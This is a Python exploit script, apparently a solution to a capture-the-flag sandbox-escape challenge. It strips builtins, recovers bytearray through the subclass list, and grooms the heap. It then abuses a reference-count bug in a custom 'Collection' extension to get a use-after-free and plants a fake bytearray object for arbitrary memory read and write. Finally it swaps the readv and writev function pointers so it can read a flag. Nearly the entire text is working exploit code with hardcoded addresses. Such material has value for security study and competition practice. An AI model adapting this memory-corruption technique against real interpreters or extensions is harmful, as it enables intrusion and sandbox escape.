# by sasdf
from sys import modules
del modules['os']
import Collection
keys = list(__builtins__.__dict__.keys())
for k in keys:
    if k != 'id' and k != 'hex' and k != 'print' and k != 'range':
        del __builtins__.__dict__[k]





classes = [].__class__.mro()[-1].__subclasses__()
posix = modules['posix']
bytearray = [c for c in classes if c.__name__ == 'bytearray'][0]
bytes = [c for c in classes if c.__name__ == 'bytes'][0]


buf = bytearray(100)
def trap():
    posix.readv(0, buf)


def p64(addr):
    s = ('0' * 16 + hex(addr)[2:])[-16:]
    return bytes.fromhex(s)[::-1]


t = bytearray(10000)
readv = 0x9b3d80
writev = 0x9b3b28
addr = 0
readv, writev = readv - addr, writev - addr
"""
bytearray object:

0x7ffff614af80: 0x0000000000000001      0x00000000009ce7e0
0x7ffff614af90: 0x0000000000002710      0x0000000000002711
0x7ffff614afa0: 0x0000000000b3e870      0x0000000000b3e870
0x7ffff614afb0: 0x0000000000000000      0x0000000000000000
"""
fake = (b'\x01\xff\xff\0\0\0\0\0' +
        b'\xe0\xe7\x9c\0\0\0\0\0' +
        b'\x10\xff\xff\xff\xff\xff\xff\0' +
        b'\x11\xff\xff\xff\xff\xff\xff\0' +
        p64(addr) * 2 + 
        b'\0\0\0\0\0\0\0\0' +
        b'\0\0\0\0\0\0\0\0'
        )
print(hex(id(fake)))

before_pad = b'a' * (8 * 2000 - 16)
addrs = p64(id(fake) + 0x20) * 1000


# Prepare heap
before = [t] * 2000
x = {"a": [t] * 1000}
after = [t] * 2000

a = Collection.Collection(x)

# Decrease XREF
lst = a.get("a")
lst = a.get("a")
print(hex(id(lst)))

# Free
del x['a']
del after
del before

# Overwrite
z = before_pad + addrs

# Increase XREF
ctr = [lst] * 100

mem = lst[0]
mem[writev: writev + 8] = mem[readv: readv + 8]
posix.writev(1023, [buf])
print(mem[writev: writev + 8])
print(buf)
trap()
